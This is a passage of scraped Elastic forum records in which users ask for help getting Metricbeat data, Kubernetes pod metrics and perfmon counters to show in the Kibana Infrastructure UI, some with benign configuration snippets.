    "body": "Hello, I have the following perfmon counter names (Bytes IN) and (Bytes IN/sec) that i want to monitor as the following image show: My modules configuration in my windows.yml file is the following: Module: windows Docs: https://www.elastic.co/guide/en/beats/metricbeat/7.3/metricbeat-module-windows.html module: windows metricsets: service period: 1m module: windows metricsets: perfmon period: 10s perfmon.counters: instance_label: ESEL.Bytes IN measurement_label: ESEL.Bytes IN query: '\\ESEL\\Bytes IN' instance_label: ESEL.Bytes IN/sec measurement_label: ESEL.Bytes IN/sec query: '\\ESEL\\Bytes IN/sec' image.png858×368 16.2 KB when i just want to monitor the Bytes IN counter i can also see it in Kibana but when i also add the second counder (Bytes IN/sec) in the yaml file i can not see in Kibana neither of them. Any ideas how to correct this? Thank you",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "7b50e195-0f3e-4b98-bc0d-2f30487bf2a6",
    "url": "https://discuss.elastic.co/t/how-do-i-get-the-infrastructure-map-working-for-kubernetes-pods/207731",
    "title": "How do I get the Infrastructure map working for Kubernetes Pods?",
    "category": [
      "Metrics"
    ],
    "author": "Richard_Neely",
    "date": "November 18, 2019, 9:42pm November 18, 2019, 11:35pm November 19, 2019, 12:46am November 19, 2019, 8:11am November 19, 2019, 3:09pm December 17, 2019, 3:09pm",
    "body": "All of my pods show up but metrics report as zero. Kube state metrics is running metrics are getting indexed into the metricbeat index. You can also see them on the Discover tab but nothing here. Running 6.8.3 across the board. Screen Shot 2019-11-13 at 10.32.53 AM.png1706×902 45.5 KB",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "5cbea2d2-9e9a-4313-99a6-8b95fff8f21e",
    "url": "https://discuss.elastic.co/t/getting-information-aruba-iap-207/206024",
    "title": "Getting information Aruba IAP-207",
    "category": [
      "Metrics"
    ],
    "author": "Joseph_John",
    "date": "October 31, 2019, 10:38am November 7, 2019, 2:56pm November 8, 2019, 9:19am November 14, 2019, 7:49am November 14, 2019, 10:04am November 14, 2019, 10:21am November 14, 2019, 11:08am November 14, 2019, 11:28am December 12, 2019, 11:28am",
    "body": "Hi All, Good afternoon After adding filebeat and auditbeat to my linux host, now I wanted to try out getting details from access point \"Aruba IAP-207\" . Guidance requested for the any documentation URL which talks about integrating accesspoints to elastic search Any one used \"Aruba IAP-207\" with elasticseach, requesting for their feedback also thanks Joseph John",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "809fe69e-b525-4e2f-af2d-2d6ecc7e2ab7",
    "url": "https://discuss.elastic.co/t/following-steps-for-setting-up-infrastructure-monitoring-app-does-not-work/202914",
    "title": "Following steps for setting up Infrastructure monitoring app does not work",
    "category": [
      "Metrics"
    ],
    "author": "akalra",
    "date": "October 9, 2019, 9:35pm October 9, 2019, 11:06pm October 10, 2019, 3:32pm October 10, 2019, 6:21pm October 10, 2019, 7:07pm November 7, 2019, 7:08pm",
    "body": "I am setting up the infrastructure monitoring for a Kubernetes cluster on GCP. I am using a hosted Elastic cloud. I followed the steps for setting up Metricbeat on kubernetes as stated online but the Infrastructure app or the kibana dashboard does not populate with any data. Please advice on correct approach to set up Kubernetes monitoring. Thanks",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "7418495e-ced3-4df9-b640-625a11dc9e48",
    "url": "https://discuss.elastic.co/t/docker-stats-metrics/201862",
    "title": "Docker Stats Metrics",
    "category": [
      "Metrics"
    ],
    "author": "",
    "date": "October 1, 2019, 8:20pm October 7, 2019, 9:51am October 7, 2019, 1:49pm October 8, 2019, 6:56pm October 9, 2019, 1:55pm October 9, 2019, 1:55pm November 6, 2019, 1:55pm",
    "body": "",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "30c4e164-f439-469b-8159-efe97502343d",
    "url": "https://discuss.elastic.co/t/monitoring-systemd-services-using-metricbeat/198284",
    "title": "Monitoring systemd services using Metricbeat",
    "category": [
      "Metrics"
    ],
    "author": "Mohammad_Etemad",
    "date": "September 5, 2019, 3:28pm September 5, 2019, 5:29pm September 5, 2019, 6:53pm September 6, 2019, 3:57pm October 4, 2019, 3:57pm",
    "body": "I was wondering if there is a way to monitor Centos services like kubelet, keepalived, even a custom service that I wrote, using Metricbeat or any other Elastic service. i.e. is there a way to have metricbeat run a command like: service myService status and see if the results is running. Thank you",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "242d9797-555c-4efc-b14b-fab22b28f1ea",
    "url": "https://discuss.elastic.co/t/infrastructure-ui-is-empty/197933",
    "title": "Infrastructure UI is empty",
    "category": [
      "Metrics"
    ],
    "author": "luksi1",
    "date": "September 3, 2019, 9:01pm September 3, 2019, 9:07pm September 4, 2019, 12:42am September 4, 2019, 8:36am September 4, 2019, 12:01pm September 4, 2019, 2:13pm September 4, 2019, 2:24pm September 4, 2019, 2:59pm September 4, 2019, 3:27pm September 4, 2019, 5:28pm September 4, 2019, 5:39pm September 4, 2019, 5:51pm September 4, 2019, 6:50pm September 4, 2019, 7:54pm September 4, 2019, 9:17pm October 2, 2019, 9:17pm",
    "body": "Hello, I'm trying to diagnose why my Infrastructure UI is empty. The waffle map is empty, but the metrics explorer is populated. I can search the metricbeat-* index without any problems. The problem arose when upgrading metricbeat to 7.x. Kibana + Elastissearch versions: 7.3.1 Everything goes straight to Elasticsearch. The Infrastructure UI configruration option is using \"host.name\" to identify hosts. And here is the mapping. GET /metricbeat-*/_mapping/field/host.name { \"metricbeat-7.3.1\" : { \"mappings\" : { \"host.name\" : { \"full_name\" : \"host.name\", \"mapping\" : { \"name\" : { \"type\" : \"text\", \"fields\" : { \"keyword\" : { \"type\" : \"keyword\", \"ignore_above\" : 256 } } } } } } } }",
    "website_area": "discuss",
    "replies": 16
  },
  {
    "id": "520a800f-7cda-45ae-8ce6-8edc32b4fff5",
    "url": "https://discuss.elastic.co/t/there-is-no-data-to-display-after-upgrading-from-7-3-to-7-3-1/197942",
    "title": "There is no data to display after upgrading from 7.3 to 7.3.1",
    "category": [
      "Metrics"
    ],
    "author": "Smoky",
    "date": "September 3, 2019, 8:20pm September 4, 2019, 8:39am September 4, 2019, 2:16pm September 4, 2019, 3:01pm September 4, 2019, 3:11pm September 4, 2019, 5:29pm September 4, 2019, 7:02pm October 2, 2019, 7:02pm",
    "body": "HI. After upgrading from 7.3 to 7.3.1, the infrastructure page comes up saying \"There is no data to display.\" The logs are still there when I go to Logs or Discover. Anyone have any idea why? Terry",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "f2cff1cb-1d0d-4de9-9d30-041bbe7a6102",
    "url": "https://discuss.elastic.co/t/there-is-no-data-to-display-beats-via-logstash/197913",
    "title": "There is no data to display. - beats via logstash",
    "category": [
      "Metrics"
    ],
    "author": "jlim0930",
    "date": "September 3, 2019, 4:43pm September 3, 2019, 5:19pm September 3, 2019, 5:35pm October 1, 2019, 5:49pm",
    "body": "I have metricbeats and filebeats installed on various machines all sending data into elastic via haproxy -> logstash -> elasticsearch. I do see the data but in the Infrastructure tab I only see \"There is no data to display\" and many of the dashboards and visualizations are broken. When installing the beats i did run setup --dashboards however did not run the setup --index-management is setup --index-management the missing step or is there something different that needs to be done when beats are sending information in via logstash?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "d6a5e1b5-fa3f-426e-87ca-93c8059ffff4",
    "url": "https://discuss.elastic.co/t/view-metrics-shows-graphql-error/196258",
    "title": "\"View Metrics\" shows GraphQL Error",
    "category": [
      "Metrics"
    ],
    "author": "pfa",
    "date": "August 22, 2019, 7:27am August 26, 2019, 3:27pm August 26, 2019, 8:16pm August 27, 2019, 1:02pm August 27, 2019, 3:05pm August 27, 2019, 3:46pm August 27, 2019, 4:20pm August 28, 2019, 10:28am September 2, 2019, 11:45am September 30, 2019, 11:45am",
    "body": "Hi! After migration from 7.1.1 to 7.3.0 the Infrastructure UI \"Show Metrics\" isn't working any more. The tiles in global view(hosts and kubernetes) show correct metrics, \"view logs\" is also working properly. Error Message: \"GraphQL Error [object Object]\" i enabled debug mode for kibana, but didn't find any hint about it. in 7.1.1 everything works as expected",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "474d136a-0c90-4bc3-a1dd-925a86df4fdc",
    "url": "https://discuss.elastic.co/t/ecs-kibana-issue-is-it-possible-to-combine-dynamic-filter-for-kubernetes-pod-name-or-kubernetes-container-module-pod-name/195449",
    "title": "ECS-Kibana issue: is it possible to combine dynamic filter for kubernetes.pod.name or kubernetes.container._module.pod.name",
    "category": [
      "Metrics"
    ],
    "author": "asp",
    "date": "August 16, 2019, 4:29pm August 19, 2019, 3:44pm August 20, 2019, 6:35am September 17, 2019, 6:41am",
    "body": "Hi, I am using metricbeat to gather information about my kubernetes cluster. I want to build my own status dashboard to see if my deployments / statefulsets in kubernetes are healthy and I want to be able to dig deeper and show performance values of containers and pods. Currently my dashboard is looking like this. (created with enhanced-table plugin) image.png1895×1061 191 KB First question: Is it possible to achieve the same in TSVB (except for the filter panel)? Doing grouping on multiple levels and coloring a text cell based on a status (calculation between two fields). Second question I want to add pod and container usage statistics. When I check the events in elasticsearch I have following to offer: My table on the bottom is gathering information from metricset.nae: state_pod: image.png753×928 58.6 KB Overall pod metrics can be found in metricset.name: pod: image.png798×1108 79.9 KB And detailed container metrics can be found in metricset.name: contianer image.png820×1104 82.2 KB Marked in green are metrics / values I would like to show. I want to be able to filter for example for a logical pod name by clicking on a table entry or in an object of tsvb. By clicking there I want to see every event which has the pod name value in the fields: kubernetes.container._module.pod.nameor kubernetes.pod.name or at best kubernetes.*.pod_name. At very best I want to also show events where field kubernetes.*.pod_name is not existing. Can this somehow be achieved with kibana? In my opinion it would be much, much easier if same information is always stored in the same field. Store the kubernetes.pod.name always in this field, regardless my event is state_pod, container, pod or whatever. Same issue I am encountering if i filter for kubernetes.node.name. If I set this filter no pod or container will be shown, because the field (with same meaning) is named differently. Thanks, Andreas",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "09cf14f3-203c-4410-8ea6-61d3587f5c0f",
    "url": "https://discuss.elastic.co/t/3-6-shards-failing-when-trying-to-visualize-on-kibana/191857",
    "title": "3/6 shards failing when trying to visualize on Kibana",
    "category": [
      "Metrics"
    ],
    "author": "sarahvo",
    "date": "July 23, 2019, 3:38pm July 23, 2019, 4:49pm July 23, 2019, 4:53pm July 23, 2019, 5:02pm July 23, 2019, 6:15pm July 24, 2019, 7:54am July 24, 2019, 7:56pm July 25, 2019, 9:13am July 25, 2019, 6:48pm July 25, 2019, 6:56pm July 26, 2019, 8:06am July 26, 2019, 6:03pm July 29, 2019, 6:35pm July 29, 2019, 6:36pm July 29, 2019, 6:41pm August 26, 2019, 6:41pm",
    "body": "Hi, I'm currently trying to do a simple POC for a potential monitoring system for my company using the Elastic stack. I have metricbeat & winlogbeat going through Logstash, which ships to Elasticsearch. I'm currently only using a single-node and would like to avoid clustering until we have a better idea of if we're going to be using the Elastic stack for our monitoring system. Right now, I have 4 of our servers set up for monitoring and it looks like data is being collected properly from each. However, when I try to graph the data, i.e. graph the number of hosts, it tells me 3/6 shards have failed and it shows 0 hosts. I can do queries in the discover section, but am unable to graph certain data. I'm also using the latest version of everything 7.2.0. Any help solving this problem is appreciated! Additional Info: Nodes: 1 Disk Available 34.47% 20.0 GB / 58.0 GB JVM Heap 43.04% 1.7 GB / 4.0 GB Indices: 511 Documents 17,510,180 Disk Usage 6.7 GB Primary Shards 511 Replica Shards 0",
    "website_area": "discuss",
    "replies": 16
  },
  {
    "id": "c012dd65-0aa0-4a59-bc90-6e15843bfee7",
    "url": "https://discuss.elastic.co/t/metricbeat-docker-shows-different-stats-for-logstash-in-container-than-logstash-monitoring/192015",
    "title": "Metricbeat/docker shows different stats for logstash in container than logstash monitoring",
    "category": [
      "Metrics"
    ],
    "author": "sgreszcz",
    "date": "July 24, 2019, 11:42am July 24, 2019, 1:05pm August 21, 2019, 1:05pm",
    "body": "I’m getting weird perf stats on logstash-netflow. Seems like the docker API perf mon says it is using 1200% CPU, but the actual logstash monitoring shows 8% CPU. Also htop also show lots of CPU headroom. Screenshot 2019-07-24 at 12.39.28.png1770×894 275 KB Screenshot 2019-07-24 at 12.36.41.png1762×1042 81 KB Screenshot 2019-07-24 at 12.35.34.png2744×2314 263 KB",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "f05ab2a9-5523-45fb-9c14-6962728093fe",
    "url": "https://discuss.elastic.co/t/problem-on-infrastructure-and-metricbeats/188864",
    "title": "Problem on Infrastructure and Metricbeats",
    "category": [
      "Metrics"
    ],
    "author": "antonopo",
    "date": "July 5, 2019, 8:01am July 5, 2019, 2:49pm August 2, 2019, 3:01pm",
    "body": "Hi, I have problem on the Infrastructure tab on Kibana. I cannot see any data of the metrics of my hosts. In the past i could see all the metrics for all the hosts there. After upgrading ELK 7.1 to 7.2 and all the metricbeats from 6.X to 7.X i cannot see the data of the metrics on the infrastructure and on the Dashboard on the metrics. 1.PNG1168×571 69.9 KB 2.PNG1475×795 31.5 KB Also if you check the metricbeat indexes on my screenshots you will see that are not with the date. Do you have any idea? Best Regards, Thanos",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "652f57a0-bc23-4b03-9e2b-2e1c373569db",
    "url": "https://discuss.elastic.co/t/infrastructure-dashboard-legends-not-clear/187924",
    "title": "Infrastructure dashboard legends not clear",
    "category": [
      "Metrics"
    ],
    "author": "",
    "date": "July 2, 2019, 9:23am June 28, 2019, 4:06pm July 2, 2019, 9:54pm July 30, 2019, 9:54pm",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "c2b50a56-c8cb-465f-817d-708b9c464855",
    "url": "https://discuss.elastic.co/t/save-setting-groupby-servers-by-custom-field-in-infrastructure-dashboard/187686",
    "title": "Save setting Groupby servers by custom field in infrastructure Dashboard",
    "category": [
      "Metrics"
    ],
    "author": "syedsfayaz",
    "date": "June 26, 2019, 10:18pm July 1, 2019, 11:06am July 1, 2019, 3:43pm July 29, 2019, 3:43pm",
    "body": "Hi I am able to categorize the servers based on the Group by : \"version\". But every time I load kibana or any new user logs in, they need to explicitly go and add that filter. Is there a way this filter can be saved for every users who uses the dashboard. ELK V 7.2 image.png1175×258 18.3 KB",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "b4c3c286-d615-4221-a654-710a507227ed",
    "url": "https://discuss.elastic.co/t/there-is-no-data-to-display-on-metric-page/185361",
    "title": "\"There is no data to display\" on metric page",
    "category": [
      "Metrics"
    ],
    "author": "aqiank",
    "date": "June 12, 2019, 8:48am June 12, 2019, 9:09am June 12, 2019, 9:22am June 12, 2019, 12:36pm June 12, 2019, 1:08pm June 12, 2019, 2:00pm June 12, 2019, 2:47pm June 13, 2019, 9:32am June 13, 2019, 10:55am June 13, 2019, 11:06am June 13, 2019, 3:06pm June 13, 2019, 5:03pm June 14, 2019, 2:49am June 14, 2019, 9:00am June 14, 2019, 9:03am June 14, 2019, 12:20pm June 14, 2019, 12:52pm June 15, 2019, 4:20am July 13, 2019, 4:20am",
    "body": "I found this message in one of the HTTP requests when loading the metrics page. [illegal_argument_exception] Fielddata is disabled on text fields by default. Set fielddata=true on [host.name] in order to load fielddata in memory by uninverting the inverted index. Note that this can however use significant memory. Alternatively use a keyword field instead. But host.name in my case is already a keyword field so I don't know what to do next. Does anyone know how to solve this problem? I have the index mapping here if it helps.",
    "website_area": "discuss",
    "replies": 19
  },
  {
    "id": "3d987e11-9b15-4e0c-bcc7-7b5f9f197051",
    "url": "https://discuss.elastic.co/t/kibana-infrastructure-ui-shows-no-metrics-for-hosts-or-kubernetes-pods/184216",
    "title": "Kibana Infrastructure UI shows no metrics for hosts or kubernetes pods",
    "category": [
      "Metrics"
    ],
    "author": "zx10r",
    "date": "June 4, 2019, 6:53pm June 4, 2019, 6:56pm June 4, 2019, 7:14pm June 7, 2019, 8:32am June 7, 2019, 9:33am June 10, 2019, 3:22am June 10, 2019, 4:27am July 8, 2019, 4:27am",
    "body": "This happens when selecting something from the main Infrastructure UI when drilling into a pod or host and trying to go to metrics it loads empty while all data data is there in indexes. The error that i see logged is bellow: \"Caused by: java.lang.IllegalArgumentException: Fielddata is disabled on text fields by default. Set fielddata=true on [kubernetes.pod.name] in order to load fielddata in memory by uninverting the inverted index. Note that this can however use significant memory. Alternatively use a keyword field instead.\", metricbeat is outputting directly to elasticsearch and the entire stack is on 7.1.1 The other thing to add is that inspecting the browser shows this error when the infrastructure metrics view is loaded: Refused to execute inline script because it violates the following Content Security Policy directive: \"script-src 'unsafe-eval' 'nonce-r+WyUN70WSO1Kp04'\". Either the 'unsafe-inline' keyword, a hash ('sha256-SHHSeLc0bp6xt4BoVVyUy+3IbVqp3ujLaR+s+kSP5UI='), or a nonce ('nonce-...') is required to enable inline execution.",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "f25aa01d-f240-4082-a79f-20291d5b106d",
    "url": "https://discuss.elastic.co/t/kibana-infrastructure-ui-does-not-show-metrics/181660",
    "title": "Kibana infrastructure UI does not show metrics",
    "category": [
      "Metrics"
    ],
    "author": "abhijith444",
    "date": "May 28, 2019, 1:39am June 3, 2019, 5:52pm July 1, 2019, 5:52pm",
    "body": "I have a setup of Beats->Logstash->Kafka<-Logstash->Elasticsearch The Infrastructure UI lists a bunch of hosts but when I click trough to \"View metrics\" I don't see any data. I am able to see the data if I write directly to Elasticsearch from metricbeat though. I am trying to figure out what are the filters used by the host page to draw the visualizations. The index pattern for the direct writes and writes through the pipeline is the same. The pipeline adds a couple of additional fields to indicate the environment of the node. Other than that the event is un altered. I found a similar issue in the below question but this doesn't talk about the pipeline. There is no data to display Infrastructure Hello World! I'm trying out Infrastructure (infra) Kibana' app, yet getting following message: There is no data to display. metricbeat-* exists with some data in it (mostly from system module) Please advise.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "565010da-4e81-4828-88bf-3256f34b452d",
    "url": "https://discuss.elastic.co/t/kibana-infrastructure-data-source/180493",
    "title": "Kibana Infrastructure data source",
    "category": [
      "Metrics"
    ],
    "author": "Jehutywong",
    "date": "May 10, 2019, 6:20am May 10, 2019, 1:50pm May 10, 2019, 2:39pm May 10, 2019, 2:44pm May 14, 2019, 3:27am May 28, 2019, 6:53am May 28, 2019, 1:50pm June 3, 2019, 5:11pm July 1, 2019, 5:13pm",
    "body": "I'd wonder, if Kibana Infrastructure app can support data source other than metricbeat. I am now collecting system metrics by Collectd. I assume Infrastructure app is looking for pre-defined field names. Can I modify field names in Collectd by Logstash, so that Infrastructure app can recognize those data.",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "ce37035a-222e-498b-b43b-2eb8c83977b0",
    "url": "https://discuss.elastic.co/t/kubernetes-docker-data-through-non-metricbeat-index/182761",
    "title": "Kubernetes / docker data through non-metricbeat index?",
    "category": [
      "Metrics"
    ],
    "author": "ethrbunny",
    "date": "May 25, 2019, 2:52pm May 25, 2019, 5:27pm May 25, 2019, 10:22pm May 25, 2019, 11:05pm June 22, 2019, 11:05pm",
    "body": "Any chance of supporting this? Metricbeat indexes were getting too cumbersome so I split out k8 and docker (among other things) to separate indexes. I'd like to be able to use these in the infrastructure panel (in addition to the 'hosts' display which seems to be working ok)",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "38089237-37a3-40ab-adf9-6d7f1956c15e",
    "url": "https://discuss.elastic.co/t/infrastructure-not-fully-working-for-users-with-limited-xpack-privileges/181761",
    "title": "Infrastructure not fully working for users with limited xpack privileges",
    "category": [
      "Metrics"
    ],
    "author": "willemdh",
    "date": "May 20, 2019, 8:06am May 20, 2019, 11:08am May 20, 2019, 11:52am May 20, 2019, 4:28pm June 17, 2019, 4:28pm",
    "body": "Hello, We have multiple Kibana Spaces and each Space has a number of users with limited privileges. All users of a Kibana Space have access to hosts where a certain field is set, for example: Read and view_index_metadata on metricbeat and metricbeat-* where {\"term\": {\"digipolis.subcel\":\"crm\"}} So infrastructure works fine for users such as myself who have access to all Kibana Spaces. Users with limited privilges seem to have access to the Infrastructure waffle view correctly. Only the hosts to which they have access are shown. But the moment they click a host and select \"View Metric\", the get \"There is no data to display\" message... In discovery they can see the metricbeat data needed. Grtz Willem",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "bfb0f556-4bbd-4521-ac2d-90d0b5c96653",
    "url": "https://discuss.elastic.co/t/issue-seeing-the-whole-infrastructure-page-when-to-many-groups-using-group-by/180869",
    "title": "Issue seeing the whole infrastructure page when to many groups using group by",
    "category": [
      "Metrics"
    ],
    "author": "DaveRoss",
    "date": "May 13, 2019, 7:17pm May 13, 2019, 7:48pm May 13, 2019, 10:57pm May 14, 2019, 1:17pm May 14, 2019, 1:56pm June 11, 2019, 1:22pm",
    "body": "I have a UI issue when trying to see pods by namespace using Kubernetes view in Infrastructure. Some group start before the window and some end after the window end. Screen Shot 2019-05-13 at 3.13.14 PM.png1740×1031 98.4 KB Anyone has the same issue ?",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "8355a6fe-932e-4d51-a295-6ecd6b3ada93",
    "url": "https://discuss.elastic.co/t/kubernetes-pods-found-but-all-metrics-0/180061",
    "title": "Kubernetes pods found, but all metrics 0%",
    "category": [
      "Metrics"
    ],
    "author": "willemdh",
    "date": "May 7, 2019, 8:48pm May 7, 2019, 9:31pm May 8, 2019, 6:41am May 8, 2019, 8:43am May 8, 2019, 1:26pm May 8, 2019, 1:59pm May 8, 2019, 4:03pm June 5, 2019, 4:03pm",
    "body": "Hello, Did some tests on the new Infrastructure ui in Kibana 6.7.1. Hosts metrics are working fine, but Kubernetes metrics seem to be missing some data. Although the pod names, nodes and namespaces are recognised, all metrics report 0%, both for cpu, memory, the inbound / outbound traffic all show 0bit/s. Metricbeat data is generated on 1 master Openshift node with following module config: - module: kubernetes metricsets: - node - system - pod - container - volume period: 10s in_cluster: false add_metadata: true kube_config: ../.kube/config host: \"node1\" hosts: [\"https://node1:10250\",\"https://node2:10250\",.......] ssl.certificate_authorities: [\"/etc/pki/ca-trust/source/anchors/openshift-ca.crt\"] ssl.certificate: \"crt\" ssl.key: \"key\" image.png1753×290 6.49 KB All kubernetes metricbeat data is in metricbeat-*. CHecking the data in discovery, I can find related metrics: As you can see, we are not running a daemonset (as this caused us too many headaches in Openshift), could it be related to in_cluster: false? Is there something else which can cause the kubernetes metrics in the Infrastructure ui to be '0'? Thanks. Willem",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "2bdc86d8-cb4d-433e-a929-d2befe4f7673",
    "url": "https://discuss.elastic.co/t/there-is-no-data-to-display/167664",
    "title": "There is no data to display",
    "category": [
      "Metrics"
    ],
    "author": "alexus",
    "date": "February 8, 2019, 4:15pm February 8, 2019, 4:33pm February 8, 2019, 5:26pm March 8, 2019, 3:15pm February 8, 2019, 7:54pm February 8, 2019, 7:58pm February 8, 2019, 10:01pm March 8, 2019, 3:04pm March 28, 2019, 9:51am April 17, 2019, 8:36am April 18, 2019, 2:59pm April 19, 2019, 4:33am April 19, 2019, 2:41pm April 20, 2019, 5:07pm May 3, 2019, 7:56pm May 3, 2019, 9:49pm May 3, 2019, 9:53pm May 6, 2019, 8:48am June 3, 2019, 8:48am",
    "body": "Hello World! I'm trying out Infrastructure (infra) Kibana' app, yet getting following message: There is no data to display. metricbeat-* exists with some data in it (mostly from system module) Please advise.",
    "website_area": "discuss",
    "replies": 19
  },
  {
    "id": "a1e18016-03da-43fe-bdad-ca1b622d57eb",
    "url": "https://discuss.elastic.co/t/see-infrastructure-dashboard-in-full-screen/175946",
    "title": "See infrastructure dashboard in full screen",
    "category": [
      "Metrics"
    ],
    "author": "syedsfayaz",
    "date": "April 9, 2019, 3:01pm April 9, 2019, 5:40pm April 9, 2019, 5:55pm April 9, 2019, 7:46pm April 9, 2019, 8:18pm April 9, 2019, 8:30pm May 7, 2019, 8:31pm",
    "body": "Hi I have upgraded my kibana to 6.7 and able to see infra dashboard. Is there a way we can close the top selection and see the dashboard in full screen . image.png1693×752 107 KB",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "d1a9431f-16e7-438d-a98c-a516a4f193c2",
    "url": "https://discuss.elastic.co/t/ui-detailed-metrics-captured-data-has-wrong-alignment-firefox-only/175549",
    "title": "UI detailed metrics: captured data has wrong alignment (firefox only)",
    "category": [
      "Metrics"
    ],
    "author": "kaem2111",
    "date": "April 5, 2019, 9:07am April 9, 2019, 8:29pm May 7, 2019, 8:31pm",
    "body": "I am using Version 6.7.0 with firefox As shown in the picture Infra.PNG709×213 14.4 KB the cursor is at position 9:40, the captured data is from 9:41, the inbound value at 9:40 in the chart is definitely below -200 while value the inbound value of 9:41 matches. The root cause, as shown in the picture is, that the origin of the marker (here at point zero) is not correctly aligned to the zero point of the graphic. Unfortunaly this only happens on firefox 60.5.2esr, on Internet Explorer it works correctly. Do you know any -moz option to fix this issue in css?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "a14d33e7-a1e8-4d03-aa3c-b50aa1bf7abb",
    "url": "https://discuss.elastic.co/t/groupby-servers-by-custom-field-in-infrastructure-dashboard/174663",
    "title": "Groupby servers by custom field in infrastructure Dashboard",
    "category": [
      "Metrics"
    ],
    "author": "syedsfayaz",
    "date": "March 31, 2019, 9:05am April 1, 2019, 8:54am April 1, 2019, 9:17pm April 1, 2019, 9:30pm April 1, 2019, 9:32pm April 8, 2019, 6:35pm April 8, 2019, 6:40pm April 8, 2019, 6:51pm April 8, 2019, 10:26pm April 8, 2019, 11:16pm April 9, 2019, 9:28am April 9, 2019, 4:39pm May 7, 2019, 4:39pm",
    "body": "I am able to see servers in Infrastructure dashboard. But I want to categorize(group by) them by a custom field like env name. Is there any configuration in Kibana or Metricbeats configuration where I can configure this.",
    "website_area": "discuss",
    "replies": 13
  },
  {
    "id": "95b7dcd5-749d-4202-8a1b-69cda0aece00",
    "url": "https://discuss.elastic.co/t/metricbeat-data-missing-from-infrastructure-ui-when-using-logstash/175295",
    "title": "Metricbeat data missing from Infrastructure UI - when using Logstash",
    "category": [
      "Metrics"
    ],
    "author": "Wayne_Taylor",
    "date": "April 4, 2019, 1:09am April 5, 2019, 8:44am May 3, 2019, 8:44am",
    "body": "Hi All, previously we were using metricbeat to ship directly to ES - but recently added logstash listener in middle. This is beats 6.3.2 with Elastic 6.7 After doing so the filebeat data is loading with no issues and shows in the logs UI - but metricbeat indexes are created, values are accurate - but nothing in the UI. I verified the index patterns are named metricbeat-* The logstash config is just a simple input and output. No filtering etc. Any ideas? Thanks Wayne",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "b9a62315-3941-4526-b8be-e0adb7b81b01",
    "url": "https://discuss.elastic.co/t/logs-time-6-hours-behind-local-time/169679",
    "title": "Logs time 6 hours behind local time",
    "category": [
      "Metrics"
    ],
    "author": "rugenl",
    "date": "February 23, 2019, 7:05pm February 25, 2019, 10:22am February 25, 2019, 1:28pm February 25, 2019, 2:56pm February 25, 2019, 7:46pm February 26, 2019, 3:18pm February 27, 2019, 11:11pm March 4, 2019, 3:01pm March 4, 2019, 7:12pm March 4, 2019, 7:20pm March 4, 2019, 7:28pm March 4, 2019, 7:41pm March 4, 2019, 7:59pm March 5, 2019, 1:15am March 5, 2019, 12:50pm March 5, 2019, 2:25pm March 5, 2019, 2:32pm March 5, 2019, 3:15pm March 5, 2019, 3:39pm March 5, 2019, 4:26pm",
    "body": "I just started investigating logs. I setup filebeat on my elastic cluster and enabled the elasticsearch and logstash modules. The data is there, but the log time is -6 hours from local. For example @timestamp is February 23rd 2019, 05:41:30.460, event.created is February 23rd 2019, 11:41:31.059 and the log record starts with [2019-02-23T11:41:30,460]. Not ironically, I'm US/Central time zone, we we are -6 offset now. Is this a bug or a configuration issue? If configuration, what component? Thanks",
    "website_area": "discuss",
    "replies": 21
  },
  {
    "id": "aa672000-569e-4d94-b035-2704f2630858",
    "url": "https://discuss.elastic.co/t/how-to-get-infrastructure-ui-working/167484",
    "title": "How to get infrastructure UI working?",
    "category": [
      "Metrics"
    ],
    "author": "asp",
    "date": "February 8, 2019, 8:37pm February 8, 2019, 8:45pm March 8, 2019, 8:58pm",
    "body": "Hi, I've setup metricbeat not to directly write into elasticsearch, but I configured it to write to a logfile. I like to get the metrics buffered in filesystem for the case that metricbeat or sth in the complete pipeline breaks, so that I don't lose events. This metricbeat probe logfile I ship via filebeat to redis. Logstash is fetching the entires and processes them by this filter: input { redis { data_type => \"list\" db => \"0\" host => \"${REDIS_HOST}\" key => \"metricbeat\" port => \"${REDIS_PORT}\" } } filter { json { id => \"json\" source => \"message\" } # delete message if no _jsonparsefailure if (\"_jsonparsefailure\" not in [tags]) { mutate { remove_field => ['message'] } } } output { elasticsearch { hosts => [\"${ES_HOST}:${ES_PORT}\"] #index => \"%{[logType]}-%{+YYYY.MM.dd}\" index => \"%{[logType]}-%{+YYYY.ww}\" } } In my eyes the result looks good in discover module: image.png1405×923 51.6 KB But if I go for the infrastructure button, then no results are shown: image.png1723×709 28.6 KB Could you help me and point at the error what I missed? Yes, I removed the message field after successful parsing, but the json output of metricbeat log does not contain a field called message. So I doubt it has sth. to do with this. I did not create the metricbeat dashboards and visualizations which are shipped metricbeat. Is that the problem? Next week i have to present kibana to some people and I would like to get this module running until then. Thanks a lot, Andreas",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "e3f6b8bc-677f-402b-944e-f132a43a0240",
    "url": "https://discuss.elastic.co/t/infrastructure-host-name-metric-are-not-displaying-properly/167340",
    "title": "Infrastructure - host.name & metric are not displaying (properly)",
    "category": [
      "Metrics"
    ],
    "author": "alexus",
